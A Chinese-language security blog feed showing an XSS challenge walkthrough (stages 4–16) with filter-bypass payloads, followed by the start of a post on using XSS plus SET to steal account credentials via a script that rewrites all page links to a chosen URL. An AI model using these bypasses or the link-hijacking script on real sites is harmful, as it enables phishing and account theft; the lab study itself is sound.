alt=""></td></tr></tbody></table></li><li><p>HTML中svg标签介绍</p><ul><li>VG使用XML格式定义图像</li><li>SVG文件可通过以下标签嵌入HTML文档:<code>&lt;embed&gt;,&lt;object&gt;</code>或<code>&lt;iframe&gt;</code>也可以通过SVG标签插入</li><li>使用方法<code>&lt;svg/事件=&quot;&quot;&gt;</code></li></ul></li><li><p>闭合触发xss</p></li></ul><table><thead><tr><th align="center"><code>burp修改数据包，在p1插入代码发现被过滤了</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827043815.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>p2也同样被过滤了，直接当作字符串输出了。在p3插入XSS代码，没有被过滤，也没有输出，F12查看源代码发现被当作属性放到hidden的value中去了</li></ul><table><thead><tr><th align="center"><code>可以考虑闭合属性来达到插入代码的目的</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827044026.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>burp修改数据包，插入xss payload</li></ul><table><thead><tr><th align="center"><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827044302.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center">复制浏览器打开，触发xss漏洞，且代码插入了网页中</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827044410.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>&quot;&gt;&lt;svg onload=alert(document.domain)&gt;%0a</code> <code>%0a为换行符少了则不触弹窗</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827044956.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="stage5-限制长度输入的xss"><a href="#stage5-限制长度输入的xss" class="headerlink" title="stage5-限制长度输入的xss"></a>stage5-限制长度输入的xss</h2><p><strong>HTML表单文本框介绍</strong></p><ul><li>HTML表单用于搜集不同类型的用户输入。表单元素指的是不同类型的input元素，复选框，单选按钮，提交按钮等等。text定义常规文本输入</li><li>属性介绍：<ul><li>value属性规定输入字段的初始值</li><li>readonly属性规定输入字段为只读</li><li>disabled属性规定字段是禁用的，被禁用的元素不可用和不可点击。被禁用的元素不会被提交</li><li>size属性规定输入字段的尺寸（以字符计）</li><li>maxlength属性规定输入字段允许的最大长度</li><li>如设置maxlength属性，则输入控件 不会接收超过所允许的字符（该属性不会提供任何反馈，如果需要提醒用户，则必须编写js代码）</li></ul></li></ul><p><strong>XSS Payload长度计算</strong></p><table><thead><tr><th align="center"><code>使用python内置len(字符串)计算对应的字节数</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827045531.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><p><strong>F12审查工具修改源代码</strong></p><ul><li>正常输入，发现发现输入长度被限制了，提交唯一字符串，F12搜索</li></ul><table><thead><tr><th align="center"><code>发现input使用了maxlength属性进行了长度的限制</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827045636.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>双击更改maxlength属性最大值，再提交</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827045717.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center"><code>F12查看，页面源代码刷新后已经恢复了maxlength的属性，但是从下一行可以看到，不管输入多长的字符串，都会被插入到value中</code></td></tr></tbody></table><p><strong>合属性触发payload</strong></p><ul><li>从上图中可以看到从输入框输入的代码都会被插入到value属性中，所以需要对value进行闭合</li></ul><table><thead><tr><th align="center"><code>1111&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827045947.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center"><code>插入后成功闭合了value属性，且在下一行插入了payload</code></td></tr></tbody></table><h2 id="state6-HTML事件中的xss"><a href="#state6-HTML事件中的xss" class="headerlink" title="state6-HTML事件中的xss"></a>state6-HTML事件中的xss</h2><p><strong>html事件介绍</strong></p><ul><li>在现代浏览器中都内置有大量的事件处理器，这些处理器都会监视特定的条件或用户行为，例如鼠标单击或浏览器窗口中完成加载某个图像。通过使用客户端javascript，可以将某些特定的事件处理器作为属性添加的标签，并可以在事件发生时执行一个或多个javascript命令或函数</li></ul><table><thead><tr><th align="center"><code>常见的HTML事件的列表</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827050217.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><p><strong>闭合分析</strong></p><ul><li>提交了payload</li></ul><table><thead><tr><th align="center">发现被当作value的属性值插入了input标签中</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827050336.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li><p>通过HTML事件来触发XSS，<code>payload：&quot;onmouseover=&quot;alert(document.domain)</code></p><ul><li>前一个引号是闭合value的前引号，等号后面的引号闭合了value后引号，同时也是为onmouseover的值加了引号围起来</li></ul></li><li><p>又或者是闭合input标签，加入最简单的payload<code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p></li></ul><p><strong>触发payload</strong></p><ul><li>成功的闭合了value属性，在其后面插入了payload，当鼠标放到文本框上时，就会弹出当前域名</li></ul><table><thead><tr><th align="center"><code>&quot;onmouseover=&quot;alert(document.domain)</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827050750.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>插入后发现尖括号全部被转义，由此可见这里进行了过滤，只能使用html中的事件来触发XSS</li></ul><table><thead><tr><th align="center"><code>&quot;&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827050849.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="stage7-空格分割属性的xss"><a href="#stage7-空格分割属性的xss" class="headerlink" title="stage7-空格分割属性的xss"></a>stage7-空格分割属性的xss</h2><p><strong>xss探测</strong></p><ul><li><p>尝试插入了111，F12，搜索发现也是被当作value的值传入</p><table><thead><tr><th align="center"><code>使用onmouseover方法触发XSS</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827051045.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>插入后并没什么反应，F12发现在空格后的值出了一堆引号</li></ul></li><li><p>重新输入字符串，验证猜想，插入111 222 333</p><table><thead><tr><th align="center"><code>果不其然每个空格后的值都多出了一堆引号</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827051238.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><p><strong>触发xss</strong></p><ul><li><p>源代码在空格后的值多出了一对引号，导致js代码无法正常执行</p><table><thead><tr><th align="center"><code>111&quot;onmouseover=&quot;document.domain&quot;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827051339.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center"><code>插入后多了一对字符串，将js代码转义成字符串，插入到value中去了</code></td></tr></tbody></table></li><li><p>这时候就可以把引号省略掉，让用来过滤的引号来补全js代码所</p><table><thead><tr><th align="center"><code>111 onmouseover=alert(document.domain)</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827051447.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center"><code>插入源代码会自动在onmousover后的值添加了一对引号，成功的触发了js代码</code></td></tr></tbody></table></li></ul><h2 id="stage8-javascript伪协议触发XSS"><a href="#stage8-javascript伪协议触发XSS" class="headerlink" title="stage8-javascript伪协议触发XSS"></a>stage8-javascript伪协议触发XSS</h2><p><strong>javascript伪协议介绍</strong></p><ul><li>将javascript代码调价到客户端的方法时把它放置在伪协议说明符javascript:后的url中。这个特殊的协议类型声明了url的主题时任何的javascript代码，它由javascript的解释器运行。如果javascript:url中代码包含有多个语句，必须使用分号将这一语句分隔<ul><li><code>JavaScript: var now = new Date();“&lt;h1&gt;The time is:&lt;/h1&gt;+now;</code></li></ul></li><li>javascript url 还可以含有只执行动作，但不会有返回值的JavaScript语句。<ul><li><code>javascript:alert(&quot;hello world!&quot;)</code></li></ul></li></ul><p><strong>探测xss</strong></p><ul><li>输入独一无二字符串提交，在响应中寻找。</li></ul><table><thead><tr><th align="center"><code>输入了1111，可以看到不仅将1111用a标签括住，还将1111当作a标签的href属性进行插入</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827051804.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><p><strong>a链接标签属性href介绍</strong></p><ul><li><a>标签定义超链接，用于从一个页面转到另一个页面</li><li><a>元素最重要的属性的href属性，它指定了链接的目标</li><li>在所有浏览器中，链接的默认外观如下<ul><li>违背访问的链接带有下划线而且是蓝色的</li><li>已被访问的链接带有下划线而且是紫色的</li><li>活动链接带有下划线而且是红色的</li></ul></li></ul><p><strong>payload触发XSS</strong></p><table><thead><tr><th align="center"><code>javascript:alert(document.domain)</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827051924.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center"><code>当前页面会将用户所输入的内容当作a标签的href属性的值，点击url的时候就会弹出当前域名</code></td></tr></tbody></table><h2 id="stage9-略过这关"><a href="#stage9-略过这关" class="headerlink" title="stage9-略过这关"></a>stage9-略过这关</h2><ul><li>这关是关于utf-7的xss漏洞，由于现在新版浏览器都是使用的utf-8，所以直接跳过。</li></ul><table><thead><tr><th align="center"><code>定位到hint，在其后面添加代码弹出域名跳过第九关</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827052124.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th><code>在id后面添加onclick=&quot;alert(document.domain)&quot;,通过作弊来跳过第九关</code></th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827052207.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="state10-绕过domain过滤的xss"><a href="#state10-绕过domain过滤的xss" class="headerlink" title="state10-绕过domain过滤的xss"></a>state10-绕过domain过滤的xss</h2><ul><li><p>上来就是恶意字符，接着查询源代码。</p><table><thead><tr><th align="center"><code>在源代码中查询，发现也是同样将用户的输入作为value的值进行插入</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827052641.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>通过闭合value标签来触发xss，插入后发现domain不见了</p><table><thead><tr><th align="center"><code>说明被过滤了</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827052725.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><p><strong>双写绕过</strong></p><ul><li><p>源代码对用户输入的domain进行了过滤，是通过判断domain字符是否出来进行了，且只进行了一次判断，那么可以采用双写绕过</p><table><thead><tr><th align="center"><code>111&quot;&gt;&lt;script&gt;alert(document.domadomainin)&lt;/script&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827052810.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center"><code>双写可以绕过，弹出了域名</code></td></tr></tbody></table></li></ul><p><strong>编码绕过</strong></p><ul><li><p>源代码只是对字符串进行了过滤，还可以采用编码来绕过过滤</p><pre><code class="hljs javascript">payload：<span class="hljs-number">1111</span><span class="hljs-string">"&gt;&lt;script&gt;eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))&lt;/script&gt;</span></code></pre><ul><li>eval() 函数计算 JavaScript 字符串，并把它作为脚本代码来执行。主要是执行atob函数</li><li>atob() 方法用于解码base64字符串</li><li>这段payload主要是调用eval函数执行atob函数解码base64字符</li><li>使用burpsuite的decoder功能对<code>alert(document.domain)</code>进行base64加密得到<code>YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==</code>,将其用eval(atob())函数执行</li></ul></li></ul><table><thead><tr><th align="center"><code>成功弹出域名</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827053230.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="stage11-绕过替换script及on事件的xss"><a href="#stage11-绕过替换script及on事件的xss" class="headerlink" title="stage11-绕过替换script及on事件的xss"></a>stage11-绕过替换script及on事件的xss</h2><ul><li><p>检测字符串位置</p><table><thead><tr><th align="center"><code>构造恶意字符串,F12查找</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827053827.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><p><strong>发现过滤</strong></p><ul><li><p>通过闭合input标签来插入payload</p><table><thead><tr><th align="center"><code>现这里对scrip进行了过滤，只要匹配到script的就在前面添加x</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827053912.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>通过html事件来尝试触发XSS,同样进行了过滤</p><table><thead><tr><th><code>只要匹配到了on就将后面的字符替换为xxx，事件没有触发成功</code></th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827054001.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><p><strong>伪协议绕过</strong></p><ul><li><p>通过JavaScript：url尝试进行绕过</p><table><thead><tr><th align="center"><code>&quot;&gt;&lt;a href=&quot;javascript:alert(document.domain)&gt;/xss/&lt;/a&gt;&quot;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827054112.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center"><code>插入后还想并没有执行alert()函数，从源代码可以代码也是对script进行了过滤在前面添加了x</code></td></tr></tbody></table></li></ul><p><strong>空格绕过</strong></p><ul><li><p>在href中的JavaScript伪协议中存在空格也是会被当作JavaScript伪协议来执行的</p><table><thead><tr><th align="center"><code>&quot;&gt; &lt;a  href=&quot;javascr    ipt:alert(document.domain)&gt;1111&lt;/a&gt;</code></th></tr></thead><tbody><tr><td align="center"><code>点击输入框后面的1111就会弹出域名</code></td></tr><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827054241.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="stage12-利用ie特性绕过xss"><a href="#stage12-利用ie特性绕过xss" class="headerlink" title="stage12-利用ie特性绕过xss"></a>stage12-利用ie特性绕过xss</h2><ul><li><p>插入独一无二字符，F12查找</p><table><thead><tr><th align="center"><code>插入asdfqwer，发现用户的输入被当作value的值插入了</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827055414.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><p><strong>尝试利用</strong></p><ul><li><p>插入 <code>1111&quot;onclick=&quot;alert(document.domain)&quot;</code>，闭合value的引号，来通过事件触发payload</p><table><thead><tr><th align="center"><code>引号被和空格都被过滤了</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827055514.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>闭合input标签，通过外部标签触发XSS</p><table><thead><tr><th align="center"><code>1111&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827055558.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center"><code>执行后发现引号和尖括号都给过滤了，没有能够闭合input标签</code></td></tr></tbody></table></li></ul><p><strong>IE特性讲解</strong></p><ul><li>IE中两个反引号’’可以闭合一个左边双引号</li></ul><p><strong>插入payload</strong></p><ul><li><p>注意onclick前面的两个是反引号不是引号，是数字1键左边的反引号</p><table><thead><tr><th align="center">```onclick=alert(document.domain)`</th></tr></thead><tbody><tr><td align="center"><code>插入后ie将两个反引号解析成了双引号，闭合了value，从而执行了payload</code></td></tr><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827055754.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="stage13-利用css特性绕过xss过滤"><a href="#stage13-利用css特性绕过xss过滤" class="headerlink" title="stage13-利用css特性绕过xss过滤"></a>stage13-利用css特性绕过xss过滤</h2><ul><li><p>输入恶意字符，F12审查</p><table><thead><tr><th align="center"><code>插入qweradsf，发f12查看源代码，直接插入到value中同时也插入到了style中</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827055917.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><p><strong>过滤发现</strong></p><ul><li><p>HTML事件触发XSS,双引号闭合value，并没有成功。</p><table><thead><tr><th align="center"><code>所有输入都被当作字符串插入到value中了</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827060009.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>闭合iput标签来触发XSS</p><table><thead><tr><th align="center"><code>发现双引号同样没能闭合，payload同样被当作字符串插入到value中</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827060154.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><p><strong>CSS特性讲解</strong></p><ul><li>background:url(javascript:alert(document.domain));设置背景颜色</li><li>background设置背景颜色,利用JavaScript伪协议执行js，目前只有ie浏览器支持，其他浏览器不支持</li></ul><p><strong>插入payload触发XSS</strong></p><ul><li><p>使用ietester，打开低版本ie</p><ul><li>输入payload，成功验证触发XSS，查看源代码发现</li></ul><table><thead><tr><th align="center"><code>payload被当style的属性执行了</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827060330.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827060348.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="stage14-ie中利用css触发xss"><a href="#stage14-ie中利用css触发xss" class="headerlink" title="stage14-ie中利用css触发xss"></a>stage14-ie中利用css触发xss</h2><p><strong>CSS介绍</strong></p><ul><li>层叠样式表(英文全程:cascading style sheets)是一种用来表现HTML(标准通用标记语言的一个应用或)或XML(标准通用标记语言的一个子集)等文件样式的计算机语言。CSS不仅可以通过静态修饰网页，还可以配合各种脚本语言动态的对网页各元素进行格式化</li></ul><p><strong>CSS中执行javascript</strong></p><ul><li>css expression(css表达式)又称Dynamic preperties(动态属性)，是微软早期DHTML的产物，因其可以在CSS中定义表达式来达到建立元素    间属性之间的联系等作用，从ie5开始得到支持，后因标准，性能，安全等问题，微软从ie2 beta2标准模式开始取消对css expression的支持</li><li>实际应用<ul><li>早期很多开发人员利用css expression实现了许多效果，比如将元素相对鼠标指针进行定位，根据一个定时器来移动元素等等。当然这些效果能够使用js来实现</li><li>虽然css表达式问题很多，但依然能在网上看到它的影子，甚至一些成熟的商业网站上。最常见的一个应用就是悬浮在页面上的某个模块(比如导航，返回顶部)</li></ul></li></ul><p><strong>注释绕过关键字过滤</strong></p><ul><li><p>CSS中的注释/**/</p></li><li><p>绕过关键字对expression的过滤。express/**/ion</p></li><li><p>插入了xss:expression</p><table><thead><tr><th align="center"><code>发现冒号后面的expression全部被转义了</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827060625.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>使用css注释符来绕过过滤</p><table><thead><tr><th align="center"><code>xss:expre/**/ssion，成功的将expression插入</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827060706.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><p><strong>插入payload触发xss</strong></p><pre><code class="hljs css"><span class="hljs-selector-tag">payload</span>：xss:expres/**/sion(if(!window.x)&#123;alert(document.domain);window.x=1&#125;)</code></pre><pre><code class="hljs css">代码解析：对expression进行了绕过之后，对window.x进行判断，这是一个不存在的信息，会直接执行alert函数，执行完之后window.x=1 ，然后上面的判断成立了，就不执行alert函数了。</code></pre><ul><li><p>插入后弹出了域名</p><table><thead><tr><th align="center"><code>查看源代码发现expression并没被注释</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827060853.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="stage15-16进制绕过过滤"><a href="#stage15-16进制绕过过滤" class="headerlink" title="stage15-16进制绕过过滤"></a>stage15-16进制绕过过滤</h2><p><strong>十六进制介绍</strong></p><ul><li><p>十六进制转换有16进制每一位上可以是从小道道为0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F十六个大小不同的数，即逢16进一，其中用A,B,C,D,E,F(字母不区分大小写)这六个字母分别表示10，11，12，13，14，15</p></li><li><p>可以使用python将字符转换为16进制类型</p><ul><li>需要用到binascii模块</li><li>print “\\x”+binascii.b2a_hex(“&lt;&gt;”)</li></ul><table><thead><tr><th align="center">\\x将16进制转换成可以执行的js代码</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827060953.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><ul><li><p>插入恶意字符，F12查找</p><table><thead><tr><th align="center"><code>插入1111111111&lt;&gt;，发现有个input</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827061128.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>尝试闭合通过事件来触发XSS，发现并没有能闭合，</p><table><thead><tr><th align="center"><code>当作字符串输入了</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827061205.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>通过闭合input标签，通过外部标签来触发XSS。同样被当作字符串给输入了。</p><table><thead><tr><th align="center"><code>说明这里不存在XSS</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827061332.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>往下滑动，发现下面存在了一个document.write的js脚本。将用户输入的尖括号都进行转义了，可能存在XSS，但需要绕过过滤</p></li></ul><p>**插入payload触发XSS</p><ul><li><p>将&lt;&gt;转换成16进制字符串分别为3c,3e  在前面加上\x表示这是一个js可识别的16进制编码</p><table><thead><tr><th align="center"><code>将\3c\3e输入后，发现\被过滤，双写\就可以绕过</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827061451.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>\x加上16进制编码才是js可执行的16进制编码</p><table><thead><tr><th align="center"><code>\\\3cscript\\\3ealert(document.domain)\\\3c/script\\\3e</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827061540.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center"><code>绕过过滤，触发了弹窗</code></td></tr></tbody></table></li></ul><h2 id="stage16-unicode绕过过滤触发XSS"><a href="#stage16-unicode绕过过滤触发XSS" class="headerlink" title="stage16-unicode绕过过滤触发XSS"></a>stage16-unicode绕过过滤触发XSS</h2><p><strong>unicode 介绍</strong></p><ul><li><p>Unicode(统一码，万国码，单一码)是计算机科学领域里的一项业界标准，包括字符集，编码方案等，Unicode是为了解决川通服的字符编码方案的局限而产生的，它为每种语言钟的每个字符设定同意并且唯一的二进制编码，以满足跨语言，跨平台进行文本转换，处理要求</p></li><li><p>使用python将字符转换为unicode类型</p><table><thead><tr><th align="center"><code>\\u表示js可识别的Unicode编码</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827061750.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><p><strong>过滤探测</strong> </p><ul><li><p>输入十六进制转换的&lt;&gt;，发现并没有变成&lt;&gt;</p><table><thead><tr><th align="center"><code>说明这里已经不能再使用十六进制来绕过了</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827061903.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><p><strong>双斜杠加unicode进行绕过</strong></p><ul><li><p>将unicode编码的&lt;&gt;进行 与\\u00结合js可识别的unicode编码</p><table><thead><tr><th align="center"><code>\\\u003c aaa\\u003e</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827061951.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><p><strong>插入payload触发xss</strong></p><table><thead><tr><th align="center">```\u003cscript\u003ealert(document.domain)\u003c/script\u003e``</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827062041.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center"><code>网页直接将payload当作js脚本执行，弹出了域名</code></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Web penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss+setookit窃取账户信息</title>
    <link href="/2020/08/06/xss+setookit%E7%9B%97%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/"/>
    <url>/2020/08/06/xss+setookit%E7%9B%97%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS-setookit盗取账户信息"><a href="#XSS-setookit盗取账户信息" class="headerlink" title="XSS+setookit盗取账户信息"></a>XSS+setookit盗取账户信息</h1><h3 id="xss修改网页链接"><a href="#xss修改网页链接" class="headerlink" title="xss修改网页链接"></a>xss修改网页链接</h3><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul><li>存在xss漏洞的地方，将当前网页的a标签里的<code>href</code>链接全部修改成恶意链接。</li></ul><pre><code class="hljs javascript">payload：&lt;script&gt;<span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">var</span> link=<span class="hljs-built_in">document</span>.getElementsByTagName(<span class="hljs-string">"a"</span>);<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;link.length;j++)&#123;  link[j].href=<span class="hljs-string">"http://baidu.com"</span>;&#125;&#125;&lt;<span class="hljs-regexp">/script&gt;</span></code></pre><h2 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h2><pre><code class="hljs javascript">代码解析<span class="hljs-built_in">window</span>.onload() 方法用于在网页加载完毕后立刻执行的操作，即当 HTML 文档加载完毕后，立刻执行某个方法。<span class="hljs-keyword">var</span>  用来创建一个变量，这里就是创建了link<span class="hljs-built_in">document</span>.getElementsByTagName 返回带有指定标签名的对象的集合j=<span class="hljs-number">0</span>开始<span class="hljs-keyword">for</span>循环，如果j的值小于link的长度j在原来的值上+<span class="hljs-number">1</span>每循环一次就遍历新的link对象也就是把a标签的连接网址改成指定的网址这段代码插入到目标网站存在XSS漏洞的网页中，当前页面的a标签里的herf 链接都会被替换成指定的url</code></pre><h2 id="demo"><a href="#demo" class="headerlink" 